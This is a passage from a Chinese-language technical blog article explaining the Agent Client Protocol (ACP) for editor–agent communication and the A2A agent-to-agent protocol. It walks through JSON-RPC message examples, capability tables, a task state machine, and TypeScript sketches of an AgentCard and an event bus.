        style ACP fill:#e3f2fd,stroke:#1565c0
    end
</code></pre>
<p><strong>核心设计理念</strong>:</p>
<ul>
<li>📝 <strong>标准化通信</strong>: 基于 JSON-RPC 2.0，使用 stdio 传输</li>
<li>🔌 <strong>即插即用</strong>: 任何支持 ACP 的编辑器都能使用任何 ACP 代理</li>
<li>🎯 <strong>代理自主性</strong>: 代理作为编辑器的子进程运行，可自主修改代码</li>
<li>🔐 <strong>权限控制</strong>: 明确的权限请求机制（文件系统、终端等）</li>
<li>🔄 <strong>会话管理</strong>: 支持会话创建、加载、状态追踪</li>
<li>📊 <strong>能力协商</strong>: 初始化时协商双方支持的功能</li>
</ul>
<h4 data-id="heading-20">3.2 ACP 协议架构</h4>
<h5 data-id="heading-21"><strong>通信模型</strong></h5>
<p>ACP 遵循 <strong>JSON-RPC 2.0</strong> 规范，定义了两种消息类型：</p>




















<table><thead><tr><th>消息类型</th><th>描述</th><th>是否需要响应</th></tr></thead><tbody><tr><td><strong>Methods</strong></td><td>请求-响应对，期望返回结果或错误</td><td>✅ 是</td></tr><tr><td><strong>Notifications</strong></td><td>单向消息，用于事件通知</td><td>❌ 否</td></tr></tbody></table>
<h5 data-id="heading-22"><strong>角色定义</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Agent：使用生成式 AI 自主修改代码的程序</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Agent</span> {
  <span class="hljs-comment">// === 基线方法（必须实现） ===</span>
  <span class="hljs-title function_">initialize</span>(): <span class="hljs-title class_">InitializeResult</span>;           <span class="hljs-comment">// 初始化和能力协商</span>
  authenticate?(): <span class="hljs-title class_">AuthResult</span>;              <span class="hljs-comment">// 身份验证（可选）</span>
  <span class="hljs-string">'session/new'</span>(): <span class="hljs-title class_">SessionId</span>;              <span class="hljs-comment">// 创建新会话</span>
  <span class="hljs-string">'session/prompt'</span>(<span class="hljs-attr">msg</span>: <span class="hljs-title class_">Message</span>): <span class="hljs-built_in">void</span>;    <span class="hljs-comment">// 接收用户提示词</span>

  <span class="hljs-comment">// === 可选方法 ===</span>
  <span class="hljs-string">'session/load'</span>?(<span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Session</span>;    <span class="hljs-comment">// 加载已有会话</span>
  <span class="hljs-string">'session/set_mode'</span>?(<span class="hljs-attr">mode</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// 设置模式（如 edit/chat）</span>

  <span class="hljs-comment">// === 通知 ===</span>
  <span class="hljs-string">'session/cancel'</span>(): <span class="hljs-built_in">void</span>;                <span class="hljs-comment">// 取消当前操作</span>
}

<span class="hljs-comment">// Client：提供用户界面的代码编辑器/IDE</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Client</span> {
  <span class="hljs-comment">// === 基线方法（必须实现） ===</span>
  <span class="hljs-string">'session/request_permission'</span>(<span class="hljs-attr">req</span>: <span class="hljs-title class_">PermissionRequest</span>): <span class="hljs-title class_">PermissionResult</span>;

  <span class="hljs-comment">// === 可选方法（根据能力） ===</span>
  <span class="hljs-string">'fs/read_text_file'</span>?(<span class="hljs-attr">path</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">string</span>;
  <span class="hljs-string">'fs/write_text_file'</span>?(<span class="hljs-attr">path</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">void</span>;
  <span class="hljs-string">'terminal/create'</span>?(<span class="hljs-attr">cmd</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">TerminalId</span>;
  <span class="hljs-string">'terminal/output'</span>?(<span class="hljs-attr">id</span>: <span class="hljs-title class_">TerminalId</span>): <span class="hljs-title class_">TerminalOutput</span>;

  <span class="hljs-comment">// === 通知 ===</span>
  <span class="hljs-string">'session/update'</span>(<span class="hljs-attr">update</span>: <span class="hljs-title class_">SessionUpdate</span>): <span class="hljs-built_in">void</span>;  <span class="hljs-comment">// 会话状态更新</span>
}
</code></pre>
<h4 data-id="heading-23">3.3 ACP 核心流程</h4>
<h5 data-id="heading-24"><strong>1. 初始化流程</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Client → Agent</span>
{
  <span class="hljs-string">"jsonrpc"</span>: <span class="hljs-string">"2.0"</span>,
  <span class="hljs-string">"id"</span>: <span class="hljs-number">0</span>,
  <span class="hljs-string">"method"</span>: <span class="hljs-string">"initialize"</span>,
  <span class="hljs-string">"params"</span>: {
    <span class="hljs-string">"protocolVersion"</span>: <span class="hljs-number">1</span>,
    <span class="hljs-string">"clientCapabilities"</span>: {
      <span class="hljs-string">"fs"</span>: {
        <span class="hljs-string">"readTextFile"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">"writeTextFile"</span>: <span class="hljs-literal">true</span>
      },
      <span class="hljs-string">"terminal"</span>: <span class="hljs-literal">true</span>
    },
    <span class="hljs-string">"clientInfo"</span>: {
      <span class="hljs-string">"name"</span>: <span class="hljs-string">"vscode"</span>,
      <span class="hljs-string">"title"</span>: <span class="hljs-string">"Visual Studio Code"</span>,
      <span class="hljs-string">"version"</span>: <span class="hljs-string">"1.95.0"</span>
    }
  }
}

<span class="hljs-comment">// Agent → Client</span>
{
  <span class="hljs-string">"jsonrpc"</span>: <span class="hljs-string">"2.0"</span>,
  <span class="hljs-string">"id"</span>: <span class="hljs-number">0</span>,
  <span class="hljs-string">"result"</span>: {
    <span class="hljs-string">"protocolVersion"</span>: <span class="hljs-number">1</span>,
    <span class="hljs-string">"agentCapabilities"</span>: {
      <span class="hljs-string">"loadSession"</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-string">"promptCapabilities"</span>: {
        <span class="hljs-string">"image"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">"audio"</span>: <span class="hljs-literal">false</span>,
        <span class="hljs-string">"embeddedContext"</span>: <span class="hljs-literal">true</span>
      },
      <span class="hljs-string">"mcp"</span>: {
        <span class="hljs-string">"http"</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">"sse"</span>: <span class="hljs-literal">false</span>
      }
    },
    <span class="hljs-string">"agentInfo"</span>: {
      <span class="hljs-string">"name"</span>: <span class="hljs-string">"claude-agent"</span>,
      <span class="hljs-string">"title"</span>: <span class="hljs-string">"Claude Code Agent"</span>,
      <span class="hljs-string">"version"</span>: <span class="hljs-string">"1.0.0"</span>
    },
    <span class="hljs-string">"authMethods"</span>: []
  }
}
</code></pre>
<p><strong>关键要求</strong>:</p>
<ul>
<li>🔢 <strong>协议版本协商</strong>: Client 提供支持的最新版本，Agent 响应选定版本</li>
<li>🎛️ <strong>能力声明</strong>: 双方明确声明支持的功能（文件系统、终端、MCP 等）</li>
<li>⚙️ <strong>向后兼容</strong>: 未声明的能力视为不支持</li>
</ul>
<h5 data-id="heading-25"><strong>2. 会话管理流程</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 创建新会话</span>
{
  <span class="hljs-string">"jsonrpc"</span>: <span class="hljs-string">"2.0"</span>,
  <span class="hljs-string">"id"</span>: <span class="hljs-number">1</span>,
  <span class="hljs-string">"method"</span>: <span class="hljs-string">"session/new"</span>,
  <span class="hljs-string">"params"</span>: {
    <span class="hljs-string">"workspaceRoot"</span>: <span class="hljs-string">"/Users/pojian/code/project"</span>,
    <span class="hljs-string">"capabilities"</span>: {
      <span class="hljs-string">"edit"</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-string">"execute"</span>: <span class="hljs-literal">true</span>
    }
  }
}

<span class="hljs-comment">// 响应</span>
{
  <span class="hljs-string">"jsonrpc"</span>: <span class="hljs-string">"2.0"</span>,
  <span class="hljs-string">"id"</span>: <span class="hljs-number">1</span>,
  <span class="hljs-string">"result"</span>: {
    <span class="hljs-string">"sessionId"</span>: <span class="hljs-string">"sess_abc123"</span>,
    <span class="hljs-string">"state"</span>: <span class="hljs-string">"ready"</span>
  }
}
</code></pre>
<h5 data-id="heading-26"><strong>3. 提示词交互流程</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Client → Agent: 发送用户提示词</span>
{
  <span class="hljs-string">"jsonrpc"</span>: <span class="hljs-string">"2.0"</span>,
  <span class="hljs-string">"id"</span>: <span class="hljs-number">2</span>,
  <span class="hljs-string">"method"</span>: <span class="hljs-string">"session/prompt"</span>,
  <span class="hljs-string">"params"</span>: {
    <span class="hljs-string">"sessionId"</span>: <span class="hljs-string">"sess_abc123"</span>,
    <span class="hljs-string">"message"</span>: {
      <span class="hljs-string">"parts"</span>: [
        {
          <span class="hljs-string">"kind"</span>: <span class="hljs-string">"text"</span>,
          <span class="hljs-string">"text"</span>: <span class="hljs-string">"重构这个函数以提高性能"</span>
        },
        {
          <span class="hljs-string">"kind"</span>: <span class="hljs-string">"resource_link"</span>,
          <span class="hljs-string">"uri"</span>: <span class="hljs-string">"file:///Users/pojian/code/project/src/utils.ts"</span>,
          <span class="hljs-string">"lineRange"</span>: { <span class="hljs-string">"start"</span>: <span class="hljs-number">10</span>, <span class="hljs-string">"end"</span>: <span class="hljs-number">25</span> }
        }
      ]
    }
  }
}

<span class="hljs-comment">// Agent → Client: 实时状态更新（通知）</span>
{
  <span class="hljs-string">"jsonrpc"</span>: <span class="hljs-string">"2.0"</span>,
  <span class="hljs-string">"method"</span>: <span class="hljs-string">"session/update"</span>,
  <span class="hljs-string">"params"</span>: {
    <span class="hljs-string">"sessionId"</span>: <span class="hljs-string">"sess_abc123"</span>,
    <span class="hljs-string">"update"</span>: {
      <span class="hljs-string">"kind"</span>: <span class="hljs-string">"agent_message_chunk"</span>,
      <span class="hljs-string">"text"</span>: <span class="hljs-string">"我来分析这个函数的性能瓶颈..."</span>
    }
  }
}

<span class="hljs-comment">// Agent → Client: 请求权限</span>
{
  <span class="hljs-string">"jsonrpc"</span>: <span class="hljs-string">"2.0"</span>,
  <span class="hljs-string">"id"</span>: <span class="hljs-number">100</span>,
  <span class="hljs-string">"method"</span>: <span class="hljs-string">"session/request_permission"</span>,
  <span class="hljs-string">"params"</span>: {
    <span class="hljs-string">"sessionId"</span>: <span class="hljs-string">"sess_abc123"</span>,
    <span class="hljs-string">"permission"</span>: {
      <span class="hljs-string">"kind"</span>: <span class="hljs-string">"file_write"</span>,
      <span class="hljs-string">"path"</span>: <span class="hljs-string">"/Users/pojian/code/project/src/utils.ts"</span>,
      <span class="hljs-string">"preview"</span>: <span class="hljs-string">"--- a/utils.ts\n+++ b/utils.ts\n..."</span>
    }
  }
}

<span class="hljs-comment">// Client → Agent: 权限响应</span>
{
  <span class="hljs-string">"jsonrpc"</span>: <span class="hljs-string">"2.0"</span>,
  <span class="hljs-string">"id"</span>: <span class="hljs-number">100</span>,
  <span class="hljs-string">"result"</span>: {
    <span class="hljs-string">"granted"</span>: <span class="hljs-literal">true</span>
  }
}

<span class="hljs-comment">// Agent → Client: 完成状态</span>
{
  <span class="hljs-string">"jsonrpc"</span>: <span class="hljs-string">"2.0"</span>,
  <span class="hljs-string">"method"</span>: <span class="hljs-string">"session/update"</span>,
  <span class="hljs-string">"params"</span>: {
    <span class="hljs-string">"sessionId"</span>: <span class="hljs-string">"sess_abc123"</span>,
    <span class="hljs-string">"update"</span>: {
      <span class="hljs-string">"kind"</span>: <span class="hljs-string">"state_change"</span>,
      <span class="hljs-string">"state"</span>: <span class="hljs-string">"completed"</span>
    }
  }
}
</code></pre>
<h4 data-id="heading-27">3.4 ACP 能力系统</h4>
<h5 data-id="heading-28"><strong>Client 能力</strong></h5>





























<table><thead><tr><th>能力域</th><th>能力</th><th>描述</th><th>关联方法</th></tr></thead><tbody><tr><td><strong>文件系统</strong></td><td><code>fs.readTextFile</code></td><td>读取文本文件</td><td><code>fs/read_text_file</code></td></tr><tr><td/><td><code>fs.writeTextFile</code></td><td>写入文本文件</td><td><code>fs/write_text_file</code></td></tr><tr><td><strong>终端</strong></td><td><code>terminal</code></td><td>执行和管理 Shell 命令</td><td><code>terminal/*</code> 全系列方法</td></tr></tbody></table>
<h5 data-id="heading-29"><strong>Agent 能力</strong></h5>








































<table><thead><tr><th>能力域</th><th>能力</th><th>描述</th></tr></thead><tbody><tr><td><strong>会话</strong></td><td><code>loadSession</code></td><td>支持加载已有会话</td></tr><tr><td><strong>提示词</strong></td><td><code>image</code></td><td>支持图像输入</td></tr><tr><td/><td><code>audio</code></td><td>支持音频输入</td></tr><tr><td/><td><code>embeddedContext</code></td><td>支持嵌入式上下文资源</td></tr><tr><td><strong>MCP</strong></td><td><code>http</code></td><td>支持 HTTP 传输的 MCP 服务器</td></tr><tr><td/><td><code>sse</code></td><td>支持 SSE 传输的 MCP 服务器（已弃用）</td></tr></tbody></table>
<h4 data-id="heading-30">3.5 ACP 协议约定</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 关键约定</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ACP_CONVENTIONS</span> = {
  <span class="hljs-comment">// 1. 路径要求</span>
  <span class="hljs-attr">filePaths</span>: <span class="hljs-string">"MUST be absolute"</span>,  <span class="hljs-comment">// 所有文件路径必须是绝对路径</span>

  <span class="hljs-comment">// 2. 行号约定</span>
  <span class="hljs-attr">lineNumbers</span>: <span class="hljs-string">"1-based"</span>,  <span class="hljs-comment">// 行号从 1 开始</span>

  <span class="hljs-comment">// 3. 文本格式</span>
  <span class="hljs-attr">textFormat</span>: <span class="hljs-string">"Markdown"</span>,  <span class="hljs-comment">// 默认使用 Markdown 格式</span>

  <span class="hljs-comment">// 4. 扩展机制</span>
  <span class="hljs-attr">customMethods</span>: <span class="hljs-string">"prefix with underscore (_method_name)"</span>,
  <span class="hljs-attr">customData</span>: <span class="hljs-string">"use _meta field"</span>,

  <span class="hljs-comment">// 5. 错误处理</span>
  <span class="hljs-attr">errorHandling</span>: <span class="hljs-string">"JSON-RPC 2.0 standard (code + message)"</span>
};
</code></pre>
<hr/>
<h3 data-id="heading-31">四、A2A (Agent-to-Agent) 深度剖析：Multi-Agent 系统的探索</h3>
<h4 data-id="heading-32">4.0 A2A 概述与设计哲学</h4>
<p><strong>A2A (Agent-to-Agent Protocol)</strong> 是 Google Gemini CLI 团队提出的实验性协议，专注于解决 <strong>Multi-Agent 系统</strong>中的核心挑战：如何让不同的 Agent 无缝协作、状态同步和任务编排。</p>
<blockquote>
<p>🎯 <strong>核心价值主张</strong></p>
<p>虽然 ACP 解决了 Editor ↔ Agent 的标准化，MCP 解决了 Agent ↔ Tools 的标准化，但 <strong>Agent ↔ Agent</strong> 的协作仍是空白地带。A2A 正是为填补这一空白而生。</p>
</blockquote>
<h5 data-id="heading-33"><strong>A2A 的三大设计支柱</strong></h5>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A2A["A2A 设计哲学"]

    A2A --&gt; P1["1️⃣ Event-Driven Architecture&lt;br/&gt;事件驱动"]
    A2A --&gt; P2["2️⃣ Stateful Task Management&lt;br/&gt;有状态任务管理"]
    A2A --&gt; P3["3️⃣ HTTP + SSE Hybrid Transport&lt;br/&gt;混合传输"]

    P1 --&gt; P1A["通过 EventBus 实现松耦合"]
    P1 --&gt; P1B["Agent 只需订阅感兴趣的事件"]
    P1 --&gt; P1C["支持流式和实时状态更新"]

    P2 --&gt; P2A["任务可持久化和恢复"]
    P2 --&gt; P2B["完整的状态转换历史"]
    P2 --&gt; P2C["支持长时间运行的复杂任务"]

    P3 --&gt; P3A["HTTP 用于 Request/Response"]
    P3 --&gt; P3B["SSE 用于实时事件推送"]
    P3 --&gt; P3C["天然支持跨网络的 Agent 协作"]

    style A2A fill:#e1f5fe,stroke:#01579b,stroke-width:3px
    style P1 fill:#fff3e0,stroke:#e65100
    style P2 fill:#f3e5f5,stroke:#4a148c
    style P3 fill:#e8f5e9,stroke:#1b5e20
</code></pre>
<h5 data-id="heading-34"><strong>为什么需要 A2A？</strong></h5>






























<table><thead><tr><th>场景</th><th>传统方案的痛点</th><th>A2A 的解决方案</th></tr></thead><tbody><tr><td><strong>Multi-Agent 协作</strong></td><td>每个 Agent 使用私有 API，无法互操作</td><td>统一的 AgentCard + Task API</td></tr><tr><td><strong>长时间任务</strong></td><td>同步调用易超时，状态无法追踪</td><td>异步 Task + 状态机管理</td></tr><tr><td><strong>实时反馈</strong></td><td>只能轮询或等待最终结果</td><td>SSE 流式推送中间状态</td></tr><tr><td><strong>Agent 发现</strong></td><td>硬编码 Agent 地址和能力</td><td>AgentCard 动态发现和能力协商</td></tr></tbody></table>
<h4 data-id="heading-35">4.1 A2A 核心架构组件</h4>
<h5 data-id="heading-36"><strong>1. AgentCard - Agent 身份与能力声明</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/a2a-server/src/http/app.ts</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">agentCard</span>: <span class="hljs-title class_">AgentCard</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Gemini SDLC Agent'</span>,
  <span class="hljs-attr">description</span>: <span class="hljs-string">'Code generation agent with streaming support'</span>,
  <span class="hljs-attr">url</span>: <span class="hljs-string">'http://localhost:41242/'</span>,
  <span class="hljs-attr">protocolVersion</span>: <span class="hljs-string">'0.3.0'</span>,

  <span class="hljs-attr">capabilities</span>: {
    <span class="hljs-attr">streaming</span>: <span class="hljs-literal">true</span>,              <span class="hljs-comment">// 支持流式输出</span>
    <span class="hljs-attr">pushNotifications</span>: <span class="hljs-literal">false</span>,     <span class="hljs-comment">// 不支持推送</span>
    <span class="hljs-attr">stateTransitionHistory</span>: <span class="hljs-literal">true</span>  <span class="hljs-comment">// 支持状态历史</span>
  },

  <span class="hljs-attr">skills</span>: [
    {
      <span class="hljs-attr">id</span>: <span class="hljs-string">'code_generation'</span>,
      <span class="hljs-attr">name</span>: <span class="hljs-string">'Code Generation'</span>,
      <span class="hljs-attr">description</span>: <span class="hljs-string">'Generate code from natural language'</span>,
      <span class="hljs-attr">tags</span>: [<span class="hljs-string">'code'</span>, <span class="hljs-string">'development'</span>],
      <span class="hljs-attr">inputModes</span>: [<span class="hljs-string">'text'</span>],
      <span class="hljs-attr">outputModes</span>: [<span class="hljs-string">'text'</span>],
      <span class="hljs-attr">examples</span>: [
        <span class="hljs-string">'Write a Python function to calculate fibonacci'</span>,
        <span class="hljs-string">'Create a REST API with authentication'</span>
      ]
    }
  ]
};
</code></pre>
<p><strong>AgentCard 的关键字段解析</strong>:</p>








































<table><thead><tr><th>字段</th><th>作用</th><th>示例值</th></tr></thead><tbody><tr><td><code>name</code></td><td>Agent 的唯一标识符</td><td>"Gemini SDLC Agent"</td></tr><tr><td><code>url</code></td><td>Agent 的 HTTP 端点</td><td>"<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A41242%2F" target="_blank" title="http://localhost:41242/" ref="nofollow noopener noreferrer">http://localhost:41242/</a>"</td></tr><tr><td><code>protocolVersion</code></td><td>A2A 协议版本</td><td>"0.3.0"</td></tr><tr><td><code>capabilities.streaming</code></td><td>是否支持 SSE 流式输出</td><td><code>true</code></td></tr><tr><td><code>capabilities.stateTransitionHistory</code></td><td>是否保留状态历史</td><td><code>true</code></td></tr><tr><td><code>skills[]</code></td><td>Agent 擅长的技能列表</td><td>代码生成、测试、重构等</td></tr></tbody></table>
<h5 data-id="heading-37"><strong>2. 任务状态机 - 生命周期管理</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 基于 @a2a-js/sdk 的 TaskState</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">TaskState</span> =
  | <span class="hljs-string">'submitted'</span>       <span class="hljs-comment">// 已提交</span>
  | <span class="hljs-string">'working'</span>         <span class="hljs-comment">// 执行中</span>
  | <span class="hljs-string">'input-required'</span>  <span class="hljs-comment">// 等待输入</span>
  | <span class="hljs-string">'completed'</span>       <span class="hljs-comment">// 已完成</span>
  | <span class="hljs-string">'failed'</span>          <span class="hljs-comment">// 失败</span>
  | <span class="hljs-string">'canceled'</span>;       <span class="hljs-comment">// 取消</span>

<span class="hljs-comment">// 状态转换流程</span>
submitted → working → input-required → working → completed
                                    ↓
                                  failed
                                    ↓
                                 canceled
</code></pre>
<p><strong>状态转换详解</strong>:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/a2a-server/src/types.ts</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TaskMetadata</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;                    <span class="hljs-comment">// 任务唯一 ID</span>
  <span class="hljs-attr">contextId</span>: <span class="hljs-built_in">string</span>;             <span class="hljs-comment">// 所属会话 ID</span>
  <span class="hljs-attr">taskState</span>: <span class="hljs-title class_">TaskState</span>;          <span class="hljs-comment">// 当前状态</span>
  <span class="hljs-attr">model</span>: <span class="hljs-built_in">string</span>;                 <span class="hljs-comment">// 使用的 LLM 模型</span>
  <span class="hljs-attr">mcpServers</span>: <span class="hljs-title class_">MCPServerInfo</span>[];   <span class="hljs-comment">// 可用的 MCP 服务器列表</span>
  <span class="hljs-attr">availableTools</span>: <span class="hljs-title class_">ToolInfo</span>[];    <span class="hljs-comment">// 可调用的工具列表</span>
}

<span class="hljs-comment">// 状态转换触发器</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span> {
  <span class="hljs-title function_">setTaskState</span>(<span class="hljs-params">newState: TaskState</span>) {
    <span class="hljs-keyword">const</span> oldState = <span class="hljs-variable language_">this</span>.<span class="hljs-property">metadata</span>.<span class="hljs-property">taskState</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">metadata</span>.<span class="hljs-property">taskState</span> = newState;

    <span class="hljs-comment">// 记录状态历史（如果开启）</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">capabilities</span>.<span class="hljs-property">stateTransitionHistory</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">stateHistory</span>.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">from</span>: oldState,
        <span class="hljs-attr">to</span>: newState,
        <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
        <span class="hljs-attr">reason</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">transitionReason</span>
      });
    }

    <span class="hljs-comment">// 触发状态变更事件</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventBus</span>.<span class="hljs-title function_">publish</span>({
      <span class="hljs-attr">kind</span>: <span class="hljs-title class_">CoderAgentEvent</span>.<span class="hljs-property">StateChangeEvent</span>,
      <span class="hljs-attr">taskId</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>,
      oldState,
      newState,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
    });
  }
}
</code></pre>
<p><strong>关键状态说明</strong>:</p>















































<table><thead><tr><th>状态</th><th>含义</th><th>典型持续时间</th><th>下一状态</th></tr></thead><tbody><tr><td><code>submitted</code></td><td>任务已提交但未开始执行</td><td>0-50ms</td><td><code>working</code></td></tr><tr><td><code>working</code></td><td>LLM 正在生成响应或执行工具调用</td><td>数秒到数分钟</td><td><code>input-required</code> / <code>completed</code> / <code>failed</code></td></tr><tr><td><code>input-required</code></td><td>等待用户确认工具调用或提供额外输入</td><td>取决于用户</td><td><code>working</code> / <code>canceled</code></td></tr><tr><td><code>completed</code></td><td>任务成功完成</td><td>终态</td><td>-</td></tr><tr><td><code>failed</code></td><td>任务执行失败</td><td>终态</td><td>-</td></tr><tr><td><code>canceled</code></td><td>用户主动取消</td><td>终态</td><td>-</td></tr></tbody></table>
<h5 data-id="heading-38"><strong>3. EventBus - 事件驱动核心</strong></h5>
<p>A2A 的 EventBus 是整个系统的神经中枢，负责：</p>
<ul>
<li>📡 <strong>解耦组件</strong>：Agent、Task、Tool 之间通过事件通信</li>
<li>🔄 <strong>流式传输</strong>：通过 SSE 实时推送事件到客户端</li>
<li>📊 <strong>状态追踪</strong>：所有状态变化都通过事件记录</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/a2a-server/src/agent/executor.ts</span>

<span class="hljs-comment">// EventBus 事件类型定义</span>
<span class="hljs-keyword">enum</span> <span class="hljs-title class_">CoderAgentEvent</span> {
  <span class="hljs-title class_">ToolCallConfirmationEvent</span> = <span class="hljs-string">'tool-call-confirmation'</span>,  <span class="hljs-comment">// 请求工具确认</span>
  <span class="hljs-title class_">ToolCallUpdateEvent</span> = <span class="hljs-string">'tool-call-update'</span>,              <span class="hljs-comment">// 工具调用状态更新</span>
  <span class="hljs-title class_">TextContentEvent</span> = <span class="hljs-string">'text-content'</span>,                     <span class="hljs-comment">// LLM 生成的文本</span>
  <span class="hljs-title class_">StateChangeEvent</span> = <span class="hljs-string">'state-change'</span>,                     <span class="hljs-comment">// 任务状态变更</span>
  <span class="hljs-title class_">ThoughtEvent</span> = <span class="hljs-string">'thought'</span>,                              <span class="hljs-comment">// Agent 的思考过程</span>
}

<span class="hljs-comment">// EventBus 实现</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecutionEventBus</span> {
  <span class="hljs-keyword">private</span> listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">EventListener</span>&gt;&gt;();
  <span class="hljs-keyword">private</span> sseClients = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">SSEClient</span>&gt;();

  <span class="hljs-comment">// 发布事件</span>
  <span class="hljs-title function_">publish</span>(<span class="hljs-params">event: CoderAgentMessage</span>) {
    <span class="hljs-comment">// 1. 通知本地监听器</span>
    <span class="hljs-keyword">const</span> listeners = <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">get</span>(event.<span class="hljs-property">kind</span>) || <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();
    listeners.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">listener</span> =&gt;</span> <span class="hljs-title function_">listener</span>(event));

    <span class="hljs-comment">// 2. 通过 SSE 推送给客户端</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sseClients</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">client</span> =&gt;</span> {
      client.<span class="hljs-title function_">send</span>({
        <span class="hljs-attr">event</span>: event.<span class="hljs-property">kind</span>,
        <span class="hljs-attr">data</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(event)
      });
    });

    <span class="hljs-comment">// 3. 持久化到数据库（可选）</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">persistenceEnabled</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">saveEvent</span>(event);
    }
  }

  <span class="hljs-comment">// 订阅事件</span>
  <span class="hljs-title function_">subscribe</span>(<span class="hljs-params">eventType: CoderAgentEvent, listener: EventListener</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">has</span>(eventType)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">set</span>(eventType, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">get</span>(eventType)!.<span class="hljs-title function_">add</span>(listener);
  }

  <span class="hljs-comment">// 添加 SSE 客户端</span>
  <span class="hljs-title function_">addSSEClient</span>(<span class="hljs-params">client: SSEClient</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sseClients</span>.<span class="hljs-title function_">add</span>(client);

    <span class="hljs-comment">// 发送历史事件（如果需要）</span>
    <span class="hljs-keyword">if</span> (client.<span class="hljs-property">wantsHistory</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">replayEvents</span>(client);
    }
  }
}
</code></pre>
<p><strong>EventBus 流式工作流程</strong>:</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph LLM["LLM Stream 处理流程"]
        Stream["LLM Stream"] --&gt; Chunk1["Chunk 1"]
        Stream --&gt; Chunk2["Chunk 2"]
        Stream --&gt; Chunk3["Chunk 3"]
        Stream --&gt; ToolCall["Tool Call"]

        Chunk1 --&gt; Publish1["EventBus.publish(TextContent)"]
        Chunk2 --&gt; Publish1
        Chunk3 --&gt; Publish1
        ToolCall --&gt; Publish1

        Publish1 --&gt; Local["Local Listeners"]
        Publish1 --&gt; SSE["SSE Clients&lt;br/&gt;(实时推送)"]
        Publish1 --&gt; Persist["Persistence Layer"]

        style LLM fill:#e3f2fd,stroke:#1565c0
    end

    subgraph Tool["Tool Execution 处理流程"]
        ToolExec["Tool Execution"] --&gt; ConfReq["Confirmation Request"]
        ConfReq --&gt; Publish2["EventBus.publish()"]

        UserApproval["User Approval"] --&gt; SetState["setState(working)"]

        ToolResult["Tool Result"] --&gt; Publish3["EventBus.publish()"]

        style Tool fill:#fff3e0,stroke:#e65100
    end

    style Publish1 fill:#c8e6c9,stroke:#2e7d32
    style Publish2 fill:#c8e6c9,stroke:#2e7d32
    style Publish3 fill:#c8e6c9,stroke:#2e7d32
</code></pre>
<h5 data-id="heading-39"><strong>4. 核心执行器 - 编排引擎</strong></h5>
